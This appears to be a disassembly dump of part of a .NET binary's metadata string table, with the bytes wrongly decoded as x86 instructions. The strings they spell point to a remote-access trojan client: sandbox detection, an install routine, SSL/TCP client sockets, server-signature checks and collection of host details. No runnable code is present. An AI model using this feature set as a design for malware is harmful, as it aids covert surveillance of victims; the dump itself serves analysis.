  407c24:	6e                   	outsb  %ds:(%esi),(%dx)
  407c25:	67 3e 6b 5f 5f 42    	imul   $0x42,%ds:0x5f(%bx),%ebx
  407c2b:	61                   	popa
  407c2c:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c2f:	6e                   	outsb  %ds:(%esi),(%dx)
  407c30:	67 46                	addr16 inc %esi
  407c32:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  407c39:	6e                   	outsb  %ds:(%esi),(%dx)
  407c3a:	74 65                	je     0x407ca1
  407c3c:	72 76                	jb     0x407cb4
  407c3e:	61                   	popa
  407c3f:	6c                   	insb   (%dx),%es:(%edi)
  407c40:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  407c45:	61                   	popa
  407c46:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c49:	6e                   	outsb  %ds:(%esi),(%dx)
  407c4a:	67 46                	addr16 inc %esi
  407c4c:	69 65 6c 64 00 3c 42 	imul   $0x423c0064,0x6c(%ebp),%esp
  407c53:	75 66                	jne    0x407cbb
  407c55:	66 65 72 3e          	data16 gs jb 0x407c97
  407c59:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407c5d:	61                   	popa
  407c5e:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c61:	6e                   	outsb  %ds:(%esi),(%dx)
  407c62:	67 46                	addr16 inc %esi
  407c64:	69 65 6c 64 00 3c 4f 	imul   $0x4f3c0064,0x6c(%ebp),%esp
  407c6b:	66 66 73 65          	data16 data16 jae 0x407cd4
  407c6f:	74 3e                	je     0x407caf
  407c71:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407c75:	61                   	popa
  407c76:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c79:	6e                   	outsb  %ds:(%esi),(%dx)
  407c7a:	67 46                	addr16 inc %esi
  407c7c:	69 65 6c 64 00 3c 53 	imul   $0x533c0064,0x6c(%ebp),%esp
  407c83:	73 6c                	jae    0x407cf1
  407c85:	43                   	inc    %ebx
  407c86:	6c                   	insb   (%dx),%es:(%edi)
  407c87:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  407c8e:	5f                   	pop    %edi
  407c8f:	42                   	inc    %edx
  407c90:	61                   	popa
  407c91:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c94:	6e                   	outsb  %ds:(%esi),(%dx)
  407c95:	67 46                	addr16 inc %esi
  407c97:	69 65 6c 64 00 3c 54 	imul   $0x543c0064,0x6c(%ebp),%esp
  407c9e:	63 70 43             	arpl   %esi,0x43(%eax)
  407ca1:	6c                   	insb   (%dx),%es:(%edi)
  407ca2:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  407ca9:	5f                   	pop    %edi
  407caa:	42                   	inc    %edx
  407cab:	61                   	popa
  407cac:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407caf:	6e                   	outsb  %ds:(%esi),(%dx)
  407cb0:	67 46                	addr16 inc %esi
  407cb2:	69 65 6c 64 00 49 6e 	imul   $0x6e490064,0x6c(%ebp),%esp
  407cb9:	6e                   	outsb  %ds:(%esi),(%dx)
  407cba:	65 72 41             	gs jb  0x407cfe
  407cbd:	64 64 4d             	fs fs dec %ebp
  407cc0:	61                   	popa
  407cc1:	70 43                	jo     0x407d06
  407cc3:	68 69 6c 64 00       	push   $0x646c69
  407cc8:	49                   	dec    %ecx
  407cc9:	6e                   	outsb  %ds:(%esi),(%dx)
  407cca:	6e                   	outsb  %ds:(%esi),(%dx)
  407ccb:	65 72 41             	gs jb  0x407d0f
  407cce:	64 64 41             	fs fs inc %ecx
  407cd1:	72 72                	jb     0x407d45
  407cd3:	61                   	popa
  407cd4:	79 43                	jns    0x407d19
  407cd6:	68 69 6c 64 00       	push   $0x646c69
  407cdb:	68 57 6e 64 00       	push   $0x646e57
  407ce0:	53                   	push   %ebx
  407ce1:	65 6e                	outsb  %gs:(%esi),(%dx)
  407ce3:	64 00 41 70          	add    %al,%fs:0x70(%ecx)
  407ce7:	70 65                	jo     0x407d4e
  407ce9:	6e                   	outsb  %ds:(%esi),(%dx)
  407cea:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  407cee:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  407cf5:	61 
  407cf6:	6c                   	insb   (%dx),%es:(%edi)
  407cf7:	75 65                	jne    0x407d5e
  407cf9:	4b                   	dec    %ebx
  407cfa:	69 6e 64 00 52 65 70 	imul   $0x70655200,0x64(%esi),%ebp
  407d01:	6c                   	insb   (%dx),%es:(%edi)
  407d02:	61                   	popa
  407d03:	63 65 00             	arpl   %esp,0x0(%ebp)
  407d06:	43                   	inc    %ebx
  407d07:	72 65                	jb     0x407d6e
  407d09:	61                   	popa
  407d0a:	74 65                	je     0x407d71
  407d0c:	49                   	dec    %ecx
  407d0d:	6e                   	outsb  %ds:(%esi),(%dx)
  407d0e:	73 74                	jae    0x407d84
  407d10:	61                   	popa
  407d11:	6e                   	outsb  %ds:(%esi),(%dx)
  407d12:	63 65 00             	arpl   %esp,0x0(%ebp)
  407d15:	73 65                	jae    0x407d7c
  407d17:	74 5f                	je     0x407d78
  407d19:	4d                   	dec    %ebp
  407d1a:	6f                   	outsl  %ds:(%esi),(%dx)
  407d1b:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  407d20:	6c                   	insb   (%dx),%es:(%edi)
  407d21:	65 4d                	gs dec %ebp
  407d23:	6f                   	outsl  %ds:(%esi),(%dx)
  407d24:	64 65 00 50 61       	fs add %dl,%gs:0x61(%eax)
  407d29:	64 64 69 6e 67 4d 6f 	fs imul $0x65646f4d,%fs:0x67(%esi),%ebp
  407d30:	64 65 
  407d32:	00 45 6e             	add    %al,0x6e(%ebp)
  407d35:	74 65                	je     0x407d9c
  407d37:	72 44                	jb     0x407d7d
  407d39:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  407d3d:	4d                   	dec    %ebp
  407d3e:	6f                   	outsl  %ds:(%esi),(%dx)
  407d3f:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  407d44:	79 70                	jns    0x407db6
  407d46:	74 6f                	je     0x407db7
  407d48:	53                   	push   %ebx
  407d49:	74 72                	je     0x407dbd
  407d4b:	65 61                	gs popa
  407d4d:	6d                   	insl   (%dx),%es:(%edi)
  407d4e:	4d                   	dec    %ebp
  407d4f:	6f                   	outsl  %ds:(%esi),(%dx)
  407d50:	64 65 00 43 6f       	fs add %al,%gs:0x6f(%ebx)
  407d55:	6d                   	insl   (%dx),%es:(%edi)
  407d56:	70 72                	jo     0x407dca
  407d58:	65 73 73             	gs jae 0x407dce
  407d5b:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  407d62:	00 43 69             	add    %al,0x69(%ebx)
  407d65:	70 68                	jo     0x407dcf
  407d67:	65 72 4d             	gs jb  0x407db7
  407d6a:	6f                   	outsl  %ds:(%esi),(%dx)
  407d6b:	64 65 00 53 65       	fs add %dl,%gs:0x65(%ebx)
  407d70:	6c                   	insb   (%dx),%es:(%edi)
  407d71:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  407d76:	64 65 00 75 74       	fs add %dh,%gs:0x74(%ebp)
  407d7b:	66 38 45 6e          	data16 cmp %al,0x6e(%ebp)
  407d7f:	63 6f 64             	arpl   %ebp,0x64(%edi)
  407d82:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  407d87:	65 74 65             	gs je  0x407def
  407d8a:	53                   	push   %ebx
  407d8b:	75 62                	jne    0x407def
  407d8d:	4b                   	dec    %ebx
  407d8e:	65 79 54             	gs jns 0x407de5
  407d91:	72 65                	jb     0x407df8
  407d93:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407d97:	74 5f                	je     0x407df8
  407d99:	4d                   	dec    %ebp
  407d9a:	65 73 73             	gs jae 0x407e10
  407d9d:	61                   	popa
  407d9e:	67 65 00 44 65       	add    %al,%gs:0x65(%si)
  407da3:	74 65                	je     0x407e0a
  407da5:	63 74 53 61          	arpl   %esi,0x61(%ebx,%edx,2)
  407da9:	6e                   	outsb  %ds:(%esi),(%dx)
  407daa:	64 62 6f 78          	bound  %ebp,%fs:0x78(%edi)
  407dae:	69 65 00 49 6e 76 6f 	imul   $0x6f766e49,0x0(%ebp),%esp
  407db5:	6b 65 00 49          	imul   $0x49,0x0(%ebp),%esp
  407db9:	45                   	inc    %ebp
  407dba:	6e                   	outsb  %ds:(%esi),(%dx)
  407dbb:	75 6d                	jne    0x407e2a
  407dbd:	65 72 61             	gs jb  0x407e21
  407dc0:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  407dc4:	49                   	dec    %ecx
  407dc5:	44                   	inc    %esp
  407dc6:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  407dcd:	6c                   	insb   (%dx),%es:(%edi)
  407dce:	65 00 54 6f 44       	add    %dl,%gs:0x44(%edi,%ebp,2)
  407dd3:	6f                   	outsl  %ds:(%esi),(%dx)
  407dd4:	75 62                	jne    0x407e38
  407dd6:	6c                   	insb   (%dx),%es:(%edi)
  407dd7:	65 00 53 77          	add    %dl,%gs:0x77(%ebx)
  407ddb:	61                   	popa
  407ddc:	70 44                	jo     0x407e22
  407dde:	6f                   	outsl  %ds:(%esi),(%dx)
  407ddf:	75 62                	jne    0x407e43
  407de1:	6c                   	insb   (%dx),%es:(%edi)
  407de2:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407de6:	74 5f                	je     0x407e47
  407de8:	48                   	dec    %eax
  407de9:	61                   	popa
  407dea:	6e                   	outsb  %ds:(%esi),(%dx)
  407deb:	64 6c                	fs insb (%dx),%es:(%edi)
  407ded:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407df1:	6e                   	outsb  %ds:(%esi),(%dx)
  407df2:	74 69                	je     0x407e5d
  407df4:	6d                   	insl   (%dx),%es:(%edi)
  407df5:	65 46                	gs inc %esi
  407df7:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  407dfe:	64 6c                	fs insb (%dx),%es:(%edi)
  407e00:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407e04:	74 4d                	je     0x407e53
  407e06:	6f                   	outsl  %ds:(%esi),(%dx)
  407e07:	64 75 6c             	fs jne 0x407e76
  407e0a:	65 48                	gs dec %eax
  407e0c:	61                   	popa
  407e0d:	6e                   	outsb  %ds:(%esi),(%dx)
  407e0e:	64 6c                	fs insb (%dx),%es:(%edi)
  407e10:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407e14:	6e                   	outsb  %ds:(%esi),(%dx)
  407e15:	74 69                	je     0x407e80
  407e17:	6d                   	insl   (%dx),%es:(%edi)
  407e18:	65 54                	gs push %esp
  407e1a:	79 70                	jns    0x407e8c
  407e1c:	65 48                	gs dec %eax
  407e1e:	61                   	popa
  407e1f:	6e                   	outsb  %ds:(%esi),(%dx)
  407e20:	64 6c                	fs insb (%dx),%es:(%edi)
  407e22:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407e26:	74 54                	je     0x407e7c
  407e28:	79 70                	jns    0x407e9a
  407e2a:	65 46                	gs inc %esi
  407e2c:	72 6f                	jb     0x407e9d
  407e2e:	6d                   	insl   (%dx),%es:(%edi)
  407e2f:	48                   	dec    %eax
  407e30:	61                   	popa
  407e31:	6e                   	outsb  %ds:(%esi),(%dx)
  407e32:	64 6c                	fs insb (%dx),%es:(%edi)
  407e34:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  407e38:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  407e3f:	65 
  407e40:	00 57 72             	add    %dl,0x72(%edi)
  407e43:	69 74 65 53 69 6e 67 	imul   $0x6c676e69,0x53(%ebp,%eiz,2),%esi
  407e4a:	6c 
  407e4b:	65 00 54 6f 53       	add    %dl,%gs:0x53(%edi,%ebp,2)
  407e50:	69 6e 67 6c 65 00 53 	imul   $0x5300656c,0x67(%esi),%ebp
  407e57:	65 74 41             	gs je  0x407e9b
  407e5a:	73 53                	jae    0x407eaf
  407e5c:	69 6e 67 6c 65 00 49 	imul   $0x4900656c,0x67(%esi),%ebp
  407e63:	6e                   	outsb  %ds:(%esi),(%dx)
  407e64:	73 74                	jae    0x407eda
  407e66:	61                   	popa
  407e67:	6c                   	insb   (%dx),%es:(%edi)
  407e68:	6c                   	insb   (%dx),%es:(%edi)
  407e69:	46                   	inc    %esi
  407e6a:	69 6c 65 00 44 65 63 	imul   $0x6f636544,0x0(%ebp,%eiz,2),%ebp
  407e71:	6f 
  407e72:	64 65 46             	fs gs inc %esi
  407e75:	72 6f                	jb     0x407ee6
  407e77:	6d                   	insl   (%dx),%es:(%edi)
  407e78:	46                   	inc    %esi
  407e79:	69 6c 65 00 53 61 76 	imul   $0x65766153,0x0(%ebp,%eiz,2),%ebp
  407e80:	65 
  407e81:	42                   	inc    %edx
  407e82:	79 74                	jns    0x407ef8
  407e84:	65 73 54             	gs jae 0x407edb
  407e87:	6f                   	outsl  %ds:(%esi),(%dx)
  407e88:	46                   	inc    %esi
  407e89:	69 6c 65 00 49 73 49 	imul   $0x6e497349,0x0(%ebp,%eiz,2),%ebp
  407e90:	6e 
  407e91:	52                   	push   %edx
  407e92:	6f                   	outsl  %ds:(%esi),(%dx)
  407e93:	6c                   	insb   (%dx),%es:(%edi)
  407e94:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  407e98:	6e                   	outsb  %ds:(%esi),(%dx)
  407e99:	64 6f                	outsl  %fs:(%esi),(%dx)
  407e9b:	77 73                	ja     0x407f10
  407e9d:	42                   	inc    %edx
  407e9e:	75 69                	jne    0x407f09
  407ea0:	6c                   	insb   (%dx),%es:(%edi)
  407ea1:	74 49                	je     0x407eec
  407ea3:	6e                   	outsb  %ds:(%esi),(%dx)
  407ea4:	52                   	push   %edx
  407ea5:	6f                   	outsl  %ds:(%esi),(%dx)
  407ea6:	6c                   	insb   (%dx),%es:(%edi)
  407ea7:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407eab:	74 41                	je     0x407eee
  407ead:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  407eb1:	65 57                	gs push %edi
  407eb3:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  407eba:	74 6c                	je     0x407f28
  407ebc:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407ec0:	74 5f                	je     0x407f21
  407ec2:	4d                   	dec    %ebp
  407ec3:	61                   	popa
  407ec4:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  407ecb:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407ecf:	6f                   	outsl  %ds:(%esi),(%dx)
  407ed0:	63 65 73             	arpl   %esp,0x73(%ebp)
  407ed3:	73 4d                	jae    0x407f22
  407ed5:	6f                   	outsl  %ds:(%esi),(%dx)
  407ed6:	64 75 6c             	fs jne 0x407f45
  407ed9:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  407edd:	74 5f                	je     0x407f3e
  407edf:	57                   	push   %edi
  407ee0:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407ee7:	79 6c                	jns    0x407f55
  407ee9:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407eed:	6f                   	outsl  %ds:(%esi),(%dx)
  407eee:	63 65 73             	arpl   %esp,0x73(%ebp)
  407ef1:	73 57                	jae    0x407f4a
  407ef3:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407efa:	79 6c                	jns    0x407f68
  407efc:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f00:	74 5f                	je     0x407f61
  407f02:	4e                   	dec    %esi
  407f03:	61                   	popa
  407f04:	6d                   	insl   (%dx),%es:(%edi)
  407f05:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f09:	74 5f                	je     0x407f6a
  407f0b:	46                   	inc    %esi
  407f0c:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f13:	00 
  407f14:	73 65                	jae    0x407f7b
  407f16:	74 5f                	je     0x407f77
  407f18:	46                   	inc    %esi
  407f19:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f20:	00 
  407f21:	47                   	inc    %edi
  407f22:	65 74 54             	gs je  0x407f79
  407f25:	65 6d                	gs insl (%dx),%es:(%edi)
  407f27:	70 46                	jo     0x407f6f
  407f29:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f30:	00 
  407f31:	47                   	inc    %edi
  407f32:	65 74 46             	gs je  0x407f7b
  407f35:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f3c:	00 
  407f3d:	66 69 6c 65 4e 61 6d 	imul   $0x6d61,0x4e(%ebp,%eiz,2),%bp
  407f44:	65 00 6c 70 4d       	add    %ch,%gs:0x4d(%eax,%esi,2)
  407f49:	6f                   	outsl  %ds:(%esi),(%dx)
  407f4a:	64 75 6c             	fs jne 0x407fb9
  407f4d:	65 4e                	gs dec %esi
  407f4f:	61                   	popa
  407f50:	6d                   	insl   (%dx),%es:(%edi)
  407f51:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f55:	74 5f                	je     0x407fb6
  407f57:	4d                   	dec    %ebp
  407f58:	61                   	popa
  407f59:	63 68 69             	arpl   %ebp,0x69(%eax)
  407f5c:	6e                   	outsb  %ds:(%esi),(%dx)
  407f5d:	65 4e                	gs dec %esi
  407f5f:	61                   	popa
  407f60:	6d                   	insl   (%dx),%es:(%edi)
  407f61:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f65:	74 5f                	je     0x407fc6
  407f67:	4f                   	dec    %edi
  407f68:	53                   	push   %ebx
  407f69:	46                   	inc    %esi
  407f6a:	75 6c                	jne    0x407fd8
  407f6c:	6c                   	insb   (%dx),%es:(%edi)
  407f6d:	4e                   	dec    %esi
  407f6e:	61                   	popa
  407f6f:	6d                   	insl   (%dx),%es:(%edi)
  407f70:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f74:	74 5f                	je     0x407fd5
  407f76:	46                   	inc    %esi
  407f77:	75 6c                	jne    0x407fe5
  407f79:	6c                   	insb   (%dx),%es:(%edi)
  407f7a:	4e                   	dec    %esi
  407f7b:	61                   	popa
  407f7c:	6d                   	insl   (%dx),%es:(%edi)
  407f7d:	65 00 49 73          	add    %cl,%gs:0x73(%ecx)
  407f81:	56                   	push   %esi
  407f82:	61                   	popa
  407f83:	6c                   	insb   (%dx),%es:(%edi)
  407f84:	69 64 44 6f 6d 61 69 	imul   $0x6e69616d,0x6f(%esp,%eax,2),%esp
  407f8b:	6e 
  407f8c:	4e                   	dec    %esi
  407f8d:	61                   	popa
  407f8e:	6d                   	insl   (%dx),%es:(%edi)
  407f8f:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f93:	74 5f                	je     0x407ff4
  407f95:	55                   	push   %ebp
  407f96:	73 65                	jae    0x407ffd
  407f98:	72 4e                	jb     0x407fe8
  407f9a:	61                   	popa
  407f9b:	6d                   	insl   (%dx),%es:(%edi)
  407f9c:	65 00 6c 6f 77       	add    %ch,%gs:0x77(%edi,%ebp,2)
  407fa1:	65 72 4e             	gs jb  0x407ff2
  407fa4:	61                   	popa
  407fa5:	6d                   	insl   (%dx),%es:(%edi)
  407fa6:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  407faa:	74 4e                	je     0x407ffa
  407fac:	61                   	popa
  407fad:	6d                   	insl   (%dx),%es:(%edi)
  407fae:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  407fb2:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  407fb6:	6f                   	outsl  %ds:(%esi),(%dx)
  407fb7:	73 74                	jae    0x40802d
  407fb9:	4e                   	dec    %esi
  407fba:	61                   	popa
  407fbb:	6d                   	insl   (%dx),%es:(%edi)
  407fbc:	65 00 6e 61          	add    %ch,%gs:0x61(%esi)
  407fc0:	6d                   	insl   (%dx),%es:(%edi)
  407fc1:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  407fc6:	65 54                	gs push %esp
  407fc8:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  407fcf:	5f                   	pop    %edi
  407fd0:	4c                   	dec    %esp
  407fd1:	61                   	popa
  407fd2:	73 74                	jae    0x408048
  407fd4:	57                   	push   %edi
  407fd5:	72 69                	jb     0x408040
  407fd7:	74 65                	je     0x40803e
  407fd9:	54                   	push   %esp
  407fda:	69 6d 65 00 54 6f 55 	imul   $0x556f5400,0x65(%ebp),%ebp
  407fe1:	6e                   	outsb  %ds:(%esi),(%dx)
  407fe2:	69 76 65 72 73 61 6c 	imul   $0x6c617372,0x65(%esi),%esi
  407fe9:	54                   	push   %esp
  407fea:	69 6d 65 00 57 72 69 	imul   $0x69725700,0x65(%ebp),%ebp
  407ff1:	74 65                	je     0x408058
  407ff3:	4c                   	dec    %esp
  407ff4:	69 6e 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%esi),%ebp
  407ffb:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  407ffe:	65 00 55 72          	add    %dl,%gs:0x72(%ebp)
  408002:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  408009:	6d                   	insl   (%dx),%es:(%edi)
  40800a:	65 54                	gs push %esp
  40800c:	79 70                	jns    0x40807e
  40800e:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408012:	74 5f                	je     0x408073
  408014:	56                   	push   %esi
  408015:	61                   	popa
  408016:	6c                   	insb   (%dx),%es:(%edi)
  408017:	75 65                	jne    0x40807e
  408019:	54                   	push   %esp
  40801a:	79 70                	jns    0x40808c
  40801c:	65 00 76 61          	add    %dh,%gs:0x61(%esi)
  408020:	6c                   	insb   (%dx),%es:(%edi)
  408021:	75 65                	jne    0x408088
  408023:	54                   	push   %esp
  408024:	79 70                	jns    0x408096
  408026:	65 00 4d 73          	add    %cl,%gs:0x73(%ebp)
  40802a:	67 50                	addr16 push %eax
  40802c:	61                   	popa
  40802d:	63 6b 54             	arpl   %ebp,0x54(%ebx)
  408030:	79 70                	jns    0x4080a2
  408032:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  408036:	6f                   	outsl  %ds:(%esi),(%dx)
  408037:	74 6f                	je     0x4080a8
  408039:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  40803c:	54                   	push   %esp
  40803d:	79 70                	jns    0x4080af
  40803f:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  408043:	74 54                	je     0x408099
  408045:	79 70                	jns    0x4080b7
  408047:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  40804b:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40804e:	74 54                	je     0x4080a4
  408050:	79 70                	jns    0x4080c2
  408052:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  408056:	6c                   	insb   (%dx),%es:(%edi)
  408057:	65 53                	gs push %ebx
  408059:	68 61 72 65 00       	push   $0x657261
  40805e:	53                   	push   %ebx
  40805f:	79 73                	jns    0x4080d4
  408061:	74 65                	je     0x4080c8
  408063:	6d                   	insl   (%dx),%es:(%edi)
  408064:	2e 43                	cs inc %ebx
  408066:	6f                   	outsl  %ds:(%esi),(%dx)
  408067:	72 65                	jb     0x4080ce
  408069:	00 53 65             	add    %dl,0x65(%ebx)
  40806c:	72 76                	jb     0x4080e4
  40806e:	65 72 73             	gs jb  0x4080e4
  408071:	69 67 6e 61 74 75 72 	imul   $0x72757461,0x6e(%edi),%esp
  408078:	65 00 43 6c          	add    %al,%gs:0x6c(%ebx)
  40807c:	6f                   	outsl  %ds:(%esi),(%dx)
  40807d:	73 65                	jae    0x4080e4
  40807f:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  408083:	70 6f                	jo     0x4080f4
  408085:	73 65                	jae    0x4080ec
  408087:	00 50 61             	add    %dl,0x61(%eax)
  40808a:	72 73                	jb     0x4080ff
  40808c:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  408090:	72 52                	jb     0x4080e4
  408092:	65 76 65             	gs jbe 0x4080fa
  408095:	72 73                	jb     0x40810a
  408097:	65 00 58 35          	add    %bl,%gs:0x35(%eax)
  40809b:	30 39                	xor    %bh,(%ecx)
  40809d:	43                   	inc    %ebx
  40809e:	65 72 74             	gs jb  0x408115
  4080a1:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080a8:	00 56 61             	add    %dl,0x61(%esi)
  4080ab:	6c                   	insb   (%dx),%es:(%edi)
  4080ac:	69 64 61 74 65 53 65 	imul   $0x72655365,0x74(%ecx,%eiz,2),%esp
  4080b3:	72 
  4080b4:	76 65                	jbe    0x40811b
  4080b6:	72 43                	jb     0x4080fb
  4080b8:	65 72 74             	gs jb  0x40812f
  4080bb:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080c2:	00 63 65             	add    %ah,0x65(%ebx)
  4080c5:	72 74                	jb     0x40813b
  4080c7:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080ce:	00 43 72             	add    %al,0x72(%ebx)
  4080d1:	65 61                	gs popa
  4080d3:	74 65                	je     0x40813a
  4080d5:	00 53 65             	add    %dl,0x65(%ebx)
  4080d8:	74 54                	je     0x40812e
  4080da:	68 72 65 61 64       	push   $0x64616572
  4080df:	45                   	inc    %ebp
  4080e0:	78 65                	js     0x408147
  4080e2:	63 75 74             	arpl   %esi,0x74(%ebp)
  4080e5:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  4080ec:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  4080f1:	65 74 65             	gs je  0x408159
  4080f4:	00 43 61             	add    %al,0x61(%ebx)
  4080f7:	6c                   	insb   (%dx),%es:(%edi)
  4080f8:	6c                   	insb   (%dx),%es:(%edi)
  4080f9:	53                   	push   %ebx
  4080fa:	69 74 65 00 57 72 69 	imul   $0x74697257,0x0(%ebp,%eiz,2),%esi
  408101:	74 
  408102:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408106:	6d                   	insl   (%dx),%es:(%edi)
  408107:	70 69                	jo     0x408172
  408109:	6c                   	insb   (%dx),%es:(%edi)
  40810a:	65 72 47             	gs jb  0x408154
  40810d:	65 6e                	outsb  %gs:(%esi),(%dx)
  40810f:	65 72 61             	gs jb  0x408173
  408112:	74 65                	je     0x408179
  408114:	64 41                	fs inc %ecx
  408116:	74 74                	je     0x40818c
  408118:	72 69                	jb     0x408183
  40811a:	62 75 74             	bound  %esi,0x74(%ebp)
  40811d:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  408122:	75 67                	jne    0x40818b
  408124:	67 61                	addr16 popa
  408126:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  40812a:	74 74                	je     0x4081a0
  40812c:	72 69                	jb     0x408197
  40812e:	62 75 74             	bound  %esi,0x74(%ebp)
  408131:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408135:	6d                   	insl   (%dx),%es:(%edi)
  408136:	56                   	push   %esi
  408137:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  40813e:	74 74                	je     0x4081b4
  408140:	72 69                	jb     0x4081ab
  408142:	62 75 74             	bound  %esi,0x74(%ebp)
  408145:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408149:	73 65                	jae    0x4081b0
  40814b:	6d                   	insl   (%dx),%es:(%edi)
  40814c:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  408150:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  408157:	72 
  408158:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  40815f:	73 73                	jae    0x4081d4
  408161:	65 6d                	gs insl (%dx),%es:(%edi)
  408163:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  408167:	72 61                	jb     0x4081ca
  408169:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  40816c:	61                   	popa
  40816d:	72 6b                	jb     0x4081da
  40816f:	41                   	inc    %ecx
  408170:	74 74                	je     0x4081e6
  408172:	72 69                	jb     0x4081dd
  408174:	62 75 74             	bound  %esi,0x74(%ebp)
  408177:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  40817c:	67 65 74 46          	addr16 gs je 0x4081c6
  408180:	72 61                	jb     0x4081e3
  408182:	6d                   	insl   (%dx),%es:(%edi)
  408183:	65 77 6f             	gs ja  0x4081f5
  408186:	72 6b                	jb     0x4081f3
  408188:	41                   	inc    %ecx
  408189:	74 74                	je     0x4081ff
  40818b:	72 69                	jb     0x4081f6
  40818d:	62 75 74             	bound  %esi,0x74(%ebp)
  408190:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408194:	73 65                	jae    0x4081fb
  408196:	6d                   	insl   (%dx),%es:(%edi)
  408197:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
